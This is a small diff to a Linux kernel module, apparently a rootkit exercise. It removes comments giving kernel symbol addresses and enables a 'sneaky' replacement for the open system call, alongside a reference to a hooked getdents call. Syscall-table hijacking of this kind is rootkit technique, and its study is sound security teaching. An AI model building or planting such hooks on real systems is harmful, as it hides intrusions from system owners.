@@ -11,9 +11,6 @@
 #include <asm/page.h>
 #include <asm/cacheflush.h>
 
-//ffffffff81077be0 T set_pages_ro
-//ffffffff81077c50 T set_pages_rw
-//ffffffff81e001a0 R sys_call_table
 
 
 #define BUFFLEN 512
@@ -71,11 +68,11 @@ asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, 
 
 
 //Define our new sneaky version of the 'open' syscall
-/*asmlinkage int sneaky_sys_open(const char *pathname, int flags)
+asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "Very, very Sneaky!\n");
   return original_open(pathname, flags);
-}*/
+}
 
 
 //Define our new sneky version of the 'getdents' syscall
